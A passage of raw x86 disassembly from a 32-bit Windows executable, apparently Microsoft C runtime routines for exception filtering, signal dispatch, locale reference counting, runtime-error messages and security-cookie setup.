  41fcdf:	je     0x41fd0c
  41fce1:	movzx  edx,BYTE PTR [ecx]
  41fce4:	movzx  eax,al
  41fce7:	jmp    0x41fd00
  41fce9:	cmp    edx,0x100
  41fcef:	jae    0x41fd04
  41fcf1:	mov    al,BYTE PTR [edi+0x430fd0]
  41fcf7:	or     BYTE PTR [esi+edx*1+0x19],al
  41fcfb:	inc    edx
  41fcfc:	movzx  eax,BYTE PTR [ecx+0x1]
  41fd00:	cmp    edx,eax
  41fd02:	jbe    0x41fce9
  41fd04:	add    ecx,0x2
  41fd07:	cmp    BYTE PTR [ecx],0x0
  41fd0a:	jne    0x41fcda
  41fd0c:	mov    eax,DWORD PTR [ebp-0x1c]
  41fd0f:	inc    edi
  41fd10:	add    eax,0x8
  41fd13:	mov    DWORD PTR [ebp-0x1c],eax
  41fd16:	cmp    edi,0x4
  41fd19:	jb     0x41fcd3
  41fd1b:	push   ebx
  41fd1c:	mov    DWORD PTR [esi+0x4],ebx
  41fd1f:	mov    DWORD PTR [esi+0x8],0x1
  41fd26:	call   0x422264
  41fd2b:	add    esp,0x4
  41fd2e:	mov    DWORD PTR [esi+0x21c],eax
  41fd34:	mov    eax,DWORD PTR [ebp-0x20]
  41fd37:	lea    ecx,[esi+0xc]
  41fd3a:	push   0x6
  41fd3c:	lea    edx,[eax+0x430fdc]
  41fd42:	pop    edi
  41fd43:	mov    ax,WORD PTR [edx]
  41fd46:	lea    edx,[edx+0x2]
  41fd49:	mov    WORD PTR [ecx],ax
  41fd4c:	lea    ecx,[ecx+0x2]
  41fd4f:	dec    edi
  41fd50:	jne    0x41fd43
  41fd52:	push   esi
  41fd53:	call   0x42236b
  41fd58:	pop    ecx
  41fd59:	xor    eax,eax
  41fd5b:	pop    edi
  41fd5c:	mov    ecx,DWORD PTR [ebp-0x4]
  41fd5f:	pop    esi
  41fd60:	xor    ecx,ebp
  41fd62:	pop    ebx
  41fd63:	call   0x421878
  41fd68:	mov    esp,ebp
  41fd6a:	pop    ebp
  41fd6b:	ret    
  41fd6c:	push   ebp
  41fd6d:	mov    ebp,esp
  41fd6f:	mov    eax,DWORD PTR [ebp+0x8]
  41fd72:	mov    eax,DWORD PTR [eax]
  41fd74:	cmp    DWORD PTR [eax],0xe06d7363
  41fd7a:	jne    0x41fda1
  41fd7c:	cmp    DWORD PTR [eax+0x10],0x3
  41fd80:	jne    0x41fda1
  41fd82:	mov    eax,DWORD PTR [eax+0x14]
  41fd85:	cmp    eax,0x19930520
  41fd8a:	je     0x41fda7
  41fd8c:	cmp    eax,0x19930521
  41fd91:	je     0x41fda7
  41fd93:	cmp    eax,0x19930522
  41fd98:	je     0x41fda7
  41fd9a:	cmp    eax,0x1994000
  41fd9f:	je     0x41fda7
  41fda1:	xor    eax,eax
  41fda3:	pop    ebp
  41fda4:	ret    0x4
  41fda7:	call   0x41f897
  41fdac:	int3   
  41fdad:	push   0x41fd6c
  41fdb2:	call   0x42216b
  41fdb7:	pop    ecx
  41fdb8:	xor    eax,eax
  41fdba:	ret    
  41fdbb:	push   esi
  41fdbc:	xor    esi,esi
  41fdbe:	push   DWORD PTR [esi+0x431238]
  41fdc4:	call   DWORD PTR ds:0x429044
  41fdca:	mov    DWORD PTR [esi+0x431238],eax
  41fdd0:	add    esi,0x4
  41fdd3:	cmp    esi,0x28
  41fdd6:	jb     0x41fdbe
  41fdd8:	pop    esi
  41fdd9:	ret    
  41fdda:	push   ebp
  41fddb:	mov    ebp,esp
  41fddd:	mov    edx,DWORD PTR [ebp+0x8]
  41fde0:	test   edx,edx
  41fde2:	je     0x41fe76
  41fde8:	push   ebx
  41fde9:	push   esi
  41fdea:	or     esi,0xffffffff
  41fded:	push   edi
  41fdee:	mov    eax,esi
  41fdf0:	lock xadd DWORD PTR [edx],eax
  41fdf4:	mov    ecx,DWORD PTR [edx+0x78]
  41fdf7:	test   ecx,ecx
  41fdf9:	je     0x41fe01
  41fdfb:	mov    eax,esi
  41fdfd:	lock xadd DWORD PTR [ecx],eax
  41fe01:	mov    ecx,DWORD PTR [edx+0x80]
  41fe07:	test   ecx,ecx
  41fe09:	je     0x41fe11
  41fe0b:	mov    eax,esi
  41fe0d:	lock xadd DWORD PTR [ecx],eax
  41fe11:	mov    ecx,DWORD PTR [edx+0x7c]
  41fe14:	test   ecx,ecx
  41fe16:	je     0x41fe1e
  41fe18:	mov    eax,esi
  41fe1a:	lock xadd DWORD PTR [ecx],eax
  41fe1e:	mov    ecx,DWORD PTR [edx+0x88]
  41fe24:	test   ecx,ecx
  41fe26:	je     0x41fe2e
  41fe28:	mov    eax,esi
  41fe2a:	lock xadd DWORD PTR [ecx],eax
  41fe2e:	push   0x6
  41fe30:	lea    ecx,[edx+0x1c]
  41fe33:	pop    ebx
  41fe34:	cmp    DWORD PTR [ecx-0x8],0x430984
  41fe3b:	je     0x41fe49
  41fe3d:	mov    edi,DWORD PTR [ecx]
  41fe3f:	test   edi,edi
  41fe41:	je     0x41fe49
  41fe43:	mov    eax,esi
  41fe45:	lock xadd DWORD PTR [edi],eax
  41fe49:	cmp    DWORD PTR [ecx-0xc],0x0
  41fe4d:	je     0x41fe5c
  41fe4f:	mov    edi,DWORD PTR [ecx-0x4]
  41fe52:	test   edi,edi
  41fe54:	je     0x41fe5c
  41fe56:	mov    eax,esi
  41fe58:	lock xadd DWORD PTR [edi],eax
  41fe5c:	add    ecx,0x10
  41fe5f:	dec    ebx
  41fe60:	jne    0x41fe34
  41fe62:	mov    ecx,DWORD PTR [edx+0x9c]
  41fe68:	add    ecx,0xb0
  41fe6e:	lock xadd DWORD PTR [ecx],esi
  41fe72:	dec    esi
  41fe73:	pop    edi
  41fe74:	pop    esi
  41fe75:	pop    ebx
  41fe76:	mov    eax,edx
  41fe78:	pop    ebp
  41fe79:	ret    
  41fe7a:	push   ebp
  41fe7b:	mov    ebp,esp
  41fe7d:	push   ebx
  41fe7e:	push   esi
  41fe7f:	push   edi
  41fe80:	mov    edi,DWORD PTR ds:0x432788
  41fe86:	xor    esi,esi
  41fe88:	push   DWORD PTR [ebp+0x8]
  41fe8b:	call   0x420ac9
  41fe90:	mov    ebx,eax
  41fe92:	pop    ecx
  41fe93:	test   ebx,ebx
  41fe95:	jne    0x41feba
  41fe97:	test   edi,edi
  41fe99:	je     0x41feba
  41fe9b:	push   esi
  41fe9c:	call   0x422179
  41fea1:	mov    edi,DWORD PTR ds:0x432788
  41fea7:	add    esi,0x3e8
  41fead:	pop    ecx
  41feae:	cmp    esi,edi
  41feb0:	jbe    0x41feb5
  41feb2:	or     esi,0xffffffff
  41feb5:	cmp    esi,0xffffffff
  41feb8:	jne    0x41fe88
  41feba:	pop    edi
  41febb:	pop    esi
  41febc:	mov    eax,ebx
  41febe:	pop    ebx
  41febf:	pop    ebp
  41fec0:	ret    
  41fec1:	push   0x8
  41fec3:	call   0x41fabe
  41fec8:	pop    ecx
  41fec9:	ret    
  41feca:	push   ebp
  41fecb:	mov    ebp,esp
  41fecd:	push   DWORD PTR ds:0x4327ac
  41fed3:	call   DWORD PTR ds:0x429048
  41fed9:	test   eax,eax
  41fedb:	je     0x41feec
  41fedd:	push   DWORD PTR [ebp+0x8]
  41fee0:	call   eax
  41fee2:	pop    ecx
  41fee3:	test   eax,eax
  41fee5:	je     0x41feec
  41fee7:	xor    eax,eax
  41fee9:	inc    eax
  41feea:	pop    ebp
  41feeb:	ret    
  41feec:	xor    eax,eax
  41feee:	pop    ebp
  41feef:	ret    
  41fef0:	push   0x24
  41fef2:	push   0x42db38
  41fef7:	call   0x4221c0
  41fefc:	and    DWORD PTR [ebp-0x2c],0x0
  41ff00:	and    DWORD PTR [ebp-0x30],0x0
  41ff04:	xor    ebx,ebx
  41ff06:	mov    DWORD PTR [ebp-0x20],ebx
  41ff09:	xor    edi,edi
  41ff0b:	mov    DWORD PTR [ebp-0x28],edi
  41ff0e:	mov    esi,DWORD PTR [ebp+0x8]
  41ff11:	cmp    esi,0xb
  41ff14:	jg     0x41ff66
  41ff16:	je     0x41ff2d
  41ff18:	mov    eax,esi
  41ff1a:	push   0x2
  41ff1c:	pop    ecx
  41ff1d:	sub    eax,ecx
  41ff1f:	je     0x41ff43
  41ff21:	sub    eax,ecx
  41ff23:	je     0x41ff2d
  41ff25:	sub    eax,ecx
  41ff27:	je     0x41ff87
  41ff29:	sub    eax,ecx
  41ff2b:	jne    0x41ff75
  41ff2d:	call   0x420bdf
  41ff32:	mov    edi,eax
  41ff34:	mov    DWORD PTR [ebp-0x28],edi
  41ff37:	test   edi,edi
  41ff39:	jne    0x41ff51
  41ff3b:	or     eax,0xffffffff
  41ff3e:	jmp    0x4200a5
  41ff43:	mov    DWORD PTR [ebp-0x1c],0x4327b4
  41ff4a:	mov    eax,ds:0x4327b4
  41ff4f:	jmp    0x41ffaf
  41ff51:	push   DWORD PTR [edi+0x5c]
  41ff54:	push   esi
  41ff55:	call   0x42271e
  41ff5a:	pop    ecx
  41ff5b:	pop    ecx
  41ff5c:	add    eax,0x8
  41ff5f:	mov    DWORD PTR [ebp-0x1c],eax
  41ff62:	mov    eax,DWORD PTR [eax]
  41ff64:	jmp    0x41ffbc
  41ff66:	mov    eax,esi
  41ff68:	sub    eax,0xf
  41ff6b:	je     0x41ffa3
  41ff6d:	sub    eax,0x6
  41ff70:	je     0x41ff95
  41ff72:	dec    eax
  41ff73:	je     0x41ff87
  41ff75:	call   0x41fb32
  41ff7a:	mov    DWORD PTR [eax],0x16
  41ff80:	call   0x422622
  41ff85:	jmp    0x41ff3b
  41ff87:	mov    DWORD PTR [ebp-0x1c],0x4327bc
  41ff8e:	mov    eax,ds:0x4327bc
  41ff93:	jmp    0x41ffaf
  41ff95:	mov    DWORD PTR [ebp-0x1c],0x4327b8
  41ff9c:	mov    eax,ds:0x4327b8
  41ffa1:	jmp    0x41ffaf
  41ffa3:	mov    DWORD PTR [ebp-0x1c],0x4327c0
  41ffaa:	mov    eax,ds:0x4327c0
  41ffaf:	xor    ebx,ebx
  41ffb1:	inc    ebx
  41ffb2:	mov    DWORD PTR [ebp-0x20],ebx
  41ffb5:	push   eax
  41ffb6:	call   DWORD PTR ds:0x429048
  41ffbc:	mov    DWORD PTR [ebp-0x24],eax
  41ffbf:	cmp    eax,0x1
  41ffc2:	je     0x4200a3
  41ffc8:	test   eax,eax
  41ffca:	jne    0x41ffd3
  41ffcc:	push   0x3
  41ffce:	call   0x41f883
  41ffd3:	test   ebx,ebx
  41ffd5:	je     0x41ffdf
  41ffd7:	push   0x0
  41ffd9:	call   0x41fabe
  41ffde:	pop    ecx
  41ffdf:	and    DWORD PTR [ebp-0x4],0x0
  41ffe3:	cmp    esi,0x8
  41ffe6:	je     0x41fff2
  41ffe8:	cmp    esi,0xb
  41ffeb:	je     0x41fff2
  41ffed:	cmp    esi,0x4
  41fff0:	jne    0x42000e
  41fff2:	mov    eax,DWORD PTR [edi+0x60]
  41fff5:	mov    DWORD PTR [ebp-0x2c],eax
  41fff8:	and    DWORD PTR [edi+0x60],0x0
  41fffc:	cmp    esi,0x8
  41ffff:	jne    0x420040
  420001:	mov    eax,DWORD PTR [edi+0x64]
  420004:	mov    DWORD PTR [ebp-0x30],eax
  420007:	mov    DWORD PTR [edi+0x64],0x8c
  42000e:	cmp    esi,0x8
  420011:	jne    0x420040
  420013:	mov    ecx,DWORD PTR ds:0x429eb8
  420019:	mov    edx,ecx
  42001b:	mov    DWORD PTR [ebp-0x34],edx
  42001e:	mov    eax,ds:0x429ebc
  420023:	add    eax,ecx
  420025:	cmp    edx,eax
  420027:	jge    0x42004d
  420029:	imul   ecx,edx,0xc
  42002c:	mov    eax,DWORD PTR [edi+0x5c]
  42002f:	and    DWORD PTR [eax+ecx*1+0x8],0x0
  420034:	inc    edx
  420035:	mov    DWORD PTR [ebp-0x34],edx
  420038:	mov    ecx,DWORD PTR ds:0x429eb8
  42003e:	jmp    0x42001e
  420040:	push   0x0
  420042:	call   DWORD PTR ds:0x429044
  420048:	mov    ecx,DWORD PTR [ebp-0x1c]
  42004b:	mov    DWORD PTR [ecx],eax
  42004d:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  420054:	call   0x420071
  420059:	cmp    esi,0x8
  42005c:	jne    0x42007e
  42005e:	push   DWORD PTR [edi+0x64]
  420061:	push   esi
  420062:	call   DWORD PTR [ebp-0x24]
  420065:	pop    ecx
  420066:	jmp    0x420082
  420068:	mov    esi,DWORD PTR [ebp+0x8]
  42006b:	mov    ebx,DWORD PTR [ebp-0x20]
  42006e:	mov    edi,DWORD PTR [ebp-0x28]
  420071:	test   ebx,ebx
  420073:	je     0x42007d
  420075:	push   0x0
  420077:	call   0x421933
  42007c:	pop    ecx
  42007d:	ret    
  42007e:	push   esi
  42007f:	call   DWORD PTR [ebp-0x24]
  420082:	pop    ecx
  420083:	cmp    esi,0x8
  420086:	je     0x420092
  420088:	cmp    esi,0xb
  42008b:	je     0x420092
  42008d:	cmp    esi,0x4
  420090:	jne    0x4200a3
  420092:	mov    eax,DWORD PTR [ebp-0x2c]
  420095:	mov    DWORD PTR [edi+0x60],eax
  420098:	cmp    esi,0x8
  42009b:	jne    0x4200a3
  42009d:	mov    eax,DWORD PTR [ebp-0x30]
  4200a0:	mov    DWORD PTR [edi+0x64],eax
  4200a3:	xor    eax,eax
  4200a5:	call   0x422205
  4200aa:	ret    
  4200ab:	push   ebp
  4200ac:	mov    ebp,esp
  4200ae:	mov    edx,DWORD PTR [ebp+0x8]
  4200b1:	xor    ecx,ecx
  4200b3:	push   ebx
  4200b4:	push   esi
  4200b5:	inc    ecx
  4200b6:	push   edi
  4200b7:	mov    eax,ecx
  4200b9:	lock xadd DWORD PTR [edx],eax
  4200bd:	mov    esi,DWORD PTR [edx+0x78]
  4200c0:	test   esi,esi
  4200c2:	je     0x4200ca
  4200c4:	mov    eax,ecx
  4200c6:	lock xadd DWORD PTR [esi],eax
  4200ca:	mov    esi,DWORD PTR [edx+0x80]
  4200d0:	test   esi,esi
  4200d2:	je     0x4200da
  4200d4:	mov    eax,ecx
  4200d6:	lock xadd DWORD PTR [esi],eax
  4200da:	mov    esi,DWORD PTR [edx+0x7c]
  4200dd:	test   esi,esi
  4200df:	je     0x4200e7
  4200e1:	mov    eax,ecx
  4200e3:	lock xadd DWORD PTR [esi],eax
  4200e7:	mov    esi,DWORD PTR [edx+0x88]
  4200ed:	test   esi,esi
  4200ef:	je     0x4200f7
  4200f1:	mov    eax,ecx
  4200f3:	lock xadd DWORD PTR [esi],eax
  4200f7:	push   0x6
  4200f9:	lea    esi,[edx+0x1c]
  4200fc:	pop    ebx
  4200fd:	cmp    DWORD PTR [esi-0x8],0x430984
  420104:	je     0x420112
  420106:	mov    edi,DWORD PTR [esi]
  420108:	test   edi,edi
  42010a:	je     0x420112
  42010c:	mov    eax,ecx
  42010e:	lock xadd DWORD PTR [edi],eax
  420112:	cmp    DWORD PTR [esi-0xc],0x0
  420116:	je     0x420125
  420118:	mov    edi,DWORD PTR [esi-0x4]
  42011b:	test   edi,edi
  42011d:	je     0x420125
  42011f:	mov    eax,ecx
  420121:	lock xadd DWORD PTR [edi],eax
  420125:	add    esi,0x10
  420128:	dec    ebx
  420129:	jne    0x4200fd
  42012b:	mov    eax,DWORD PTR [edx+0x9c]
  420131:	add    eax,0xb0
  420136:	lock xadd DWORD PTR [eax],ecx
  42013a:	inc    ecx
  42013b:	pop    edi
  42013c:	pop    esi
  42013d:	pop    ebx
  42013e:	pop    ebp
  42013f:	ret    
  420140:	push   0x8
  420142:	call   0x421933
  420147:	pop    ecx
  420148:	ret    
  420149:	push   esi
  42014a:	push   0x4
  42014c:	push   0x20
  42014e:	call   0x41ef78
  420153:	pop    ecx
  420154:	pop    ecx
  420155:	mov    esi,eax
  420157:	push   esi
  420158:	call   DWORD PTR ds:0x429044
  42015e:	mov    ds:0x433bf0,eax
  420163:	mov    ds:0x433bec,eax
  420168:	test   esi,esi
  42016a:	jne    0x420171
  42016c:	push   0x18
  42016e:	pop    eax
  42016f:	pop    esi
  420170:	ret    
  420171:	and    DWORD PTR [esi],0x0
  420174:	xor    eax,eax
  420176:	pop    esi
  420177:	ret    
  420178:	push   ebp
  420179:	mov    ebp,esp
  42017b:	push   esi
  42017c:	call   0x420bdf
  420181:	mov    esi,eax
  420183:	test   esi,esi
  420185:	je     0x4202d0
  42018b:	mov    edx,DWORD PTR [esi+0x5c]
  42018e:	mov    ecx,edx
  420190:	push   edi
  420191:	mov    edi,DWORD PTR [ebp+0x8]
  420194:	cmp    DWORD PTR [ecx],edi
  420196:	je     0x4201a5
  420198:	add    ecx,0xc
  42019b:	lea    eax,[edx+0x90]
  4201a1:	cmp    ecx,eax
  4201a3:	jb     0x420194
  4201a5:	lea    eax,[edx+0x90]
  4201ab:	cmp    ecx,eax
  4201ad:	jae    0x4201b3
  4201af:	cmp    DWORD PTR [ecx],edi
  4201b1:	je     0x4201b5
  4201b3:	xor    ecx,ecx
  4201b5:	test   ecx,ecx
  4201b7:	je     0x4202cd
  4201bd:	mov    edx,DWORD PTR [ecx+0x8]
  4201c0:	test   edx,edx
  4201c2:	je     0x4202cd
  4201c8:	cmp    edx,0x5
  4201cb:	jne    0x4201d9
  4201cd:	and    DWORD PTR [ecx+0x8],0x0
  4201d1:	xor    eax,eax
  4201d3:	inc    eax
  4201d4:	jmp    0x4202cf
  4201d9:	cmp    edx,0x1
  4201dc:	jne    0x4201e6
  4201de:	or     eax,0xffffffff
  4201e1:	jmp    0x4202cf
  4201e6:	mov    eax,DWORD PTR [ebp+0xc]
  4201e9:	push   ebx
  4201ea:	mov    ebx,DWORD PTR [esi+0x60]
  4201ed:	mov    DWORD PTR [esi+0x60],eax
  4201f0:	cmp    DWORD PTR [ecx+0x4],0x8
  4201f4:	jne    0x4202ba
  4201fa:	push   0x24
  4201fc:	pop    edi
  4201fd:	mov    eax,DWORD PTR [esi+0x5c]
  420200:	and    DWORD PTR [edi+eax*1+0x8],0x0
  420205:	add    edi,0xc
  420208:	cmp    edi,0x90
  42020e:	jl     0x4201fd
  420210:	cmp    DWORD PTR [ecx],0xc000008e
  420216:	mov    edi,DWORD PTR [esi+0x64]
  420219:	jne    0x420227
  42021b:	mov    DWORD PTR [esi+0x64],0x83
  420222:	jmp    0x4202ad
  420227:	cmp    DWORD PTR [ecx],0xc0000090
  42022d:	jne    0x420238
  42022f:	mov    DWORD PTR [esi+0x64],0x81
  420236:	jmp    0x4202ad
  420238:	cmp    DWORD PTR [ecx],0xc0000091
  42023e:	jne    0x420249
  420240:	mov    DWORD PTR [esi+0x64],0x84
  420247:	jmp    0x4202ad
  420249:	cmp    DWORD PTR [ecx],0xc0000093
  42024f:	jne    0x42025a
  420251:	mov    DWORD PTR [esi+0x64],0x85
  420258:	jmp    0x4202ad
  42025a:	cmp    DWORD PTR [ecx],0xc000008d
  420260:	jne    0x42026b
  420262:	mov    DWORD PTR [esi+0x64],0x82
  420269:	jmp    0x4202ad
  42026b:	cmp    DWORD PTR [ecx],0xc000008f
  420271:	jne    0x42027c
  420273:	mov    DWORD PTR [esi+0x64],0x86
  42027a:	jmp    0x4202ad
  42027c:	cmp    DWORD PTR [ecx],0xc0000092
  420282:	jne    0x42028d
  420284:	mov    DWORD PTR [esi+0x64],0x8a
  42028b:	jmp    0x4202ad
  42028d:	cmp    DWORD PTR [ecx],0xc00002b5
  420293:	jne    0x42029e
  420295:	mov    DWORD PTR [esi+0x64],0x8d
  42029c:	jmp    0x4202ad
  42029e:	cmp    DWORD PTR [ecx],0xc00002b4
  4202a4:	jne    0x4202ad
  4202a6:	mov    DWORD PTR [esi+0x64],0x8e
  4202ad:	push   DWORD PTR [esi+0x64]
  4202b0:	push   0x8
  4202b2:	call   edx
  4202b4:	pop    ecx
  4202b5:	mov    DWORD PTR [esi+0x64],edi
  4202b8:	jmp    0x4202c3
  4202ba:	push   DWORD PTR [ecx+0x4]
  4202bd:	and    DWORD PTR [ecx+0x8],0x0
  4202c1:	call   edx
  4202c3:	pop    ecx
  4202c4:	mov    DWORD PTR [esi+0x60],ebx
  4202c7:	or     eax,0xffffffff
  4202ca:	pop    ebx
  4202cb:	jmp    0x4202cf
  4202cd:	xor    eax,eax
  4202cf:	pop    edi
  4202d0:	pop    esi
  4202d1:	pop    ebp
  4202d2:	ret    
  4202d3:	push   ebp
  4202d4:	mov    ebp,esp
  4202d6:	sub    esp,0x1fc
  4202dc:	mov    eax,ds:0x4314e0
  4202e1:	xor    eax,ebp
  4202e3:	mov    DWORD PTR [ebp-0x4],eax
  4202e6:	push   esi
  4202e7:	mov    esi,DWORD PTR [ebp+0x8]
  4202ea:	push   edi
  4202eb:	push   esi
  4202ec:	call   0x421da0
  4202f1:	mov    edi,eax
  4202f3:	pop    ecx
  4202f4:	test   edi,edi
  4202f6:	je     0x420475
  4202fc:	push   ebx
  4202fd:	push   0x3
  4202ff:	call   0x420b9f
  420304:	pop    ecx
  420305:	cmp    eax,0x1
  420308:	je     0x42041d
  42030e:	push   0x3
  420310:	call   0x420b9f
  420315:	pop    ecx
  420316:	test   eax,eax
  420318:	jne    0x420327
  42031a:	cmp    DWORD PTR ds:0x432000,0x1
  420321:	je     0x42041d
  420327:	cmp    esi,0xfc
  42032d:	je     0x420474
  420333:	push   0x42a888
  420338:	push   0x314
  42033d:	push   0x432008
  420342:	call   0x422b77
  420347:	add    esp,0xc
  42034a:	xor    ebx,ebx
  42034c:	test   eax,eax
  42034e:	jne    0x420485
  420354:	push   0x104
  420359:	push   0x43203a
  42035e:	push   ebx
  42035f:	mov    ds:0x432242,ax
  420365:	call   DWORD PTR ds:0x42907c
  42036b:	mov    esi,0x2fb
  420370:	test   eax,eax
  420372:	jne    0x42038f
  420374:	push   0x42a8bc
  420379:	push   esi
  42037a:	push   0x43203a
  42037f:	call   0x422b77
  420384:	add    esp,0xc
  420387:	test   eax,eax
  420389:	jne    0x420485
  42038f:	push   0x43203a
  420394:	call   0x422bd3
  420399:	inc    eax
  42039a:	pop    ecx
  42039b:	cmp    eax,0x3c
  42039e:	jbe    0x4203d5
  4203a0:	push   0x43203a
  4203a5:	call   0x422bd3
  4203aa:	push   0x3
  4203ac:	push   0x42a8ec
  4203b1:	lea    ecx,[eax*2+0x431fc4]
  4203b8:	mov    eax,ecx
  4203ba:	sub    eax,0x43203a
  4203bf:	sar    eax,1
  4203c1:	sub    esi,eax
  4203c3:	push   esi
  4203c4:	push   ecx
  4203c5:	call   0x422bec
  4203ca:	add    esp,0x14
  4203cd:	test   eax,eax
  4203cf:	jne    0x420485
  4203d5:	push   0x42a8f4
  4203da:	push   0x314
  4203df:	mov    esi,0x432008
  4203e4:	push   esi
  4203e5:	call   0x422b0b
  4203ea:	add    esp,0xc
  4203ed:	test   eax,eax
  4203ef:	jne    0x420485
  4203f5:	push   edi
  4203f6:	push   0x314
  4203fb:	push   esi
  4203fc:	call   0x422b0b
  420401:	add    esp,0xc
  420404:	test   eax,eax
  420406:	jne    0x420485
  420408:	push   0x12010
  42040d:	push   0x42a900
  420412:	push   esi
  420413:	call   0x422caa
  420418:	add    esp,0xc
  42041b:	jmp    0x420474
  42041d:	push   0xfffffff4
  42041f:	call   DWORD PTR ds:0x429064
  420425:	mov    esi,eax
  420427:	test   esi,esi
  420429:	je     0x420474
  42042b:	cmp    esi,0xffffffff
  42042e:	je     0x420474
  420430:	xor    ebx,ebx
  420432:	mov    ecx,ebx
  420434:	mov    al,BYTE PTR [edi+ecx*2]
  420437:	mov    BYTE PTR [ebp+ecx*1-0x1f8],al
  42043e:	cmp    WORD PTR [edi+ecx*2],bx
  420442:	je     0x42044d
  420444:	inc    ecx
  420445:	cmp    ecx,0x1f4
  42044b:	jb     0x420434
  42044d:	push   ebx
  42044e:	lea    eax,[ebp-0x1fc]
  420454:	mov    BYTE PTR [ebp-0x5],bl
  420457:	push   eax
  420458:	lea    eax,[ebp-0x1f8]
  42045e:	push   eax
  42045f:	call   0x422a80
  420464:	pop    ecx
  420465:	push   eax
  420466:	lea    eax,[ebp-0x1f8]
  42046c:	push   eax
  42046d:	push   esi
  42046e:	call   DWORD PTR ds:0x429078
  420474:	pop    ebx
  420475:	mov    ecx,DWORD PTR [ebp-0x4]
  420478:	pop    edi
  420479:	xor    ecx,ebp
  42047b:	pop    esi
  42047c:	call   0x421878
  420481:	mov    esp,ebp
  420483:	pop    ebp
  420484:	ret    
  420485:	push   ebx
  420486:	push   ebx
  420487:	push   ebx
  420488:	push   ebx
  420489:	push   ebx
  42048a:	call   0x41fb45
  42048f:	int3   
  420490:	push   ebp
  420491:	mov    ebp,esp
  420493:	sub    esp,0x14
  420496:	and    DWORD PTR [ebp-0xc],0x0
  42049a:	and    DWORD PTR [ebp-0x8],0x0
  42049e:	mov    eax,ds:0x4314e0
  4204a3:	push   esi
  4204a4:	push   edi
  4204a5:	mov    edi,0xbb40e64e
  4204aa:	mov    esi,0xffff0000
  4204af:	cmp    eax,edi
  4204b1:	je     0x4204c0
  4204b3:	test   esi,eax
  4204b5:	je     0x4204c0
  4204b7:	not    eax
  4204b9:	mov    ds:0x4314e4,eax
  4204be:	jmp    0x420526
  4204c0:	lea    eax,[ebp-0xc]
  4204c3:	push   eax
  4204c4:	call   DWORD PTR ds:0x429088
  4204ca:	mov    eax,DWORD PTR [ebp-0x8]
  4204cd:	xor    eax,DWORD PTR [ebp-0xc]
  4204d0:	mov    DWORD PTR [ebp-0x4],eax
  4204d3:	call   DWORD PTR ds:0x429040
  4204d9:	xor    DWORD PTR [ebp-0x4],eax
  4204dc:	call   DWORD PTR ds:0x429084
  4204e2:	xor    DWORD PTR [ebp-0x4],eax
  4204e5:	lea    eax,[ebp-0x14]
  4204e8:	push   eax
  4204e9:	call   DWORD PTR ds:0x429080
  4204ef:	mov    ecx,DWORD PTR [ebp-0x10]
  4204f2:	lea    eax,[ebp-0x4]
  4204f5:	xor    ecx,DWORD PTR [ebp-0x14]
  4204f8:	xor    ecx,DWORD PTR [ebp-0x4]
  4204fb:	xor    ecx,eax
  4204fd:	cmp    ecx,edi
  4204ff:	jne    0x420508
  420501:	mov    ecx,0xbb40e64f
  420506:	jmp    0x420518
  420508:	test   esi,ecx
  42050a:	jne    0x420518
  42050c:	mov    eax,ecx
  42050e:	or     eax,0x4711
  420513:	shl    eax,0x10
  420516:	or     ecx,eax
  420518:	mov    DWORD PTR ds:0x4314e0,ecx
  42051e:	not    ecx
  420520:	mov    DWORD PTR ds:0x4314e4,ecx
  420526:	pop    edi
  420527:	pop    esi
  420528:	mov    esp,ebp
  42052a:	pop    ebp
  42052b:	ret    
  42052c:	int3   
  42052d:	int3   
  42052e:	int3   
  42052f:	int3   
  420530:	push   ebp
  420531:	mov    ebp,esp
  420533:	sub    esp,0x18
  420536:	push   ebx
  420537:	mov    ebx,DWORD PTR [ebp+0xc]
  42053a:	push   esi
  42053b:	push   edi
  42053c:	mov    BYTE PTR [ebp-0x1],0x0
  420540:	mov    edi,DWORD PTR [ebx+0x8]
  420543:	lea    esi,[ebx+0x10]
  420546:	xor    edi,DWORD PTR ds:0x4314e0
  42054c:	mov    DWORD PTR [ebp-0xc],0x1
  420553:	mov    eax,DWORD PTR [edi]
  420555:	cmp    eax,0xfffffffe
  420558:	je     0x420567
  42055a:	mov    ecx,DWORD PTR [edi+0x4]
  42055d:	add    ecx,esi
  42055f:	xor    ecx,DWORD PTR [eax+esi*1]
  420562:	call   0x421878
  420567:	mov    eax,DWORD PTR [edi+0x8]
  42056a:	mov    ecx,DWORD PTR [edi+0xc]
  42056d:	add    ecx,esi
  42056f:	xor    ecx,DWORD PTR [eax+esi*1]
  420572:	call   0x421878
  420577:	mov    eax,DWORD PTR [ebp+0x8]
  42057a:	test   BYTE PTR [eax+0x4],0x66
  42057e:	jne    0x420653
  420584:	mov    DWORD PTR [ebp-0x18],eax
  420587:	mov    eax,DWORD PTR [ebp+0x10]
  42058a:	mov    DWORD PTR [ebp-0x14],eax
  42058d:	lea    eax,[ebp-0x18]
  420590:	mov    DWORD PTR [ebx-0x4],eax
  420593:	mov    eax,DWORD PTR [ebx+0xc]
  420596:	mov    DWORD PTR [ebp-0x8],eax
  420599:	cmp    eax,0xfffffffe
  42059c:	je     0x42068f
  4205a2:	lea    eax,[eax+eax*2]
  4205a5:	lea    eax,[eax+0x4]
  4205a8:	mov    ecx,DWORD PTR [edi+eax*4+0x4]
  4205ac:	lea    eax,[edi+eax*4]
  4205af:	mov    ebx,DWORD PTR [eax]
  4205b1:	mov    DWORD PTR [ebp-0x10],eax
  4205b4:	test   ecx,ecx
  4205b6:	je     0x420633
  4205b8:	mov    edx,esi
  4205ba:	call   0x422852
  4205bf:	mov    cl,0x1
  4205c1:	mov    BYTE PTR [ebp-0x1],cl
  4205c4:	test   eax,eax
  4205c6:	js     0x42064a
  4205cc:	jle    0x420636
  4205ce:	mov    eax,DWORD PTR [ebp+0x8]
  4205d1:	cmp    DWORD PTR [eax],0xe06d7363
  4205d7:	jne    0x420601
  4205d9:	cmp    DWORD PTR ds:0x433b48,0x0
  4205e0:	je     0x420601
  4205e2:	push   0x433b48
  4205e7:	call   0x41f8d0
  4205ec:	add    esp,0x4
  4205ef:	test   eax,eax
  4205f1:	je     0x420601
  4205f3:	push   0x1
  4205f5:	push   DWORD PTR [ebp+0x8]
  4205f8:	call   DWORD PTR ds:0x433b48
  4205fe:	add    esp,0x8
  420601:	mov    edx,DWORD PTR [ebp+0x8]
  420604:	mov    ecx,DWORD PTR [ebp+0xc]
  420607:	call   0x422882
  42060c:	mov    eax,DWORD PTR [ebp+0xc]
  42060f:	mov    edx,DWORD PTR [ebp-0x8]
  420612:	cmp    DWORD PTR [eax+0xc],edx
  420615:	je     0x420627
  420617:	push   0x4314e0
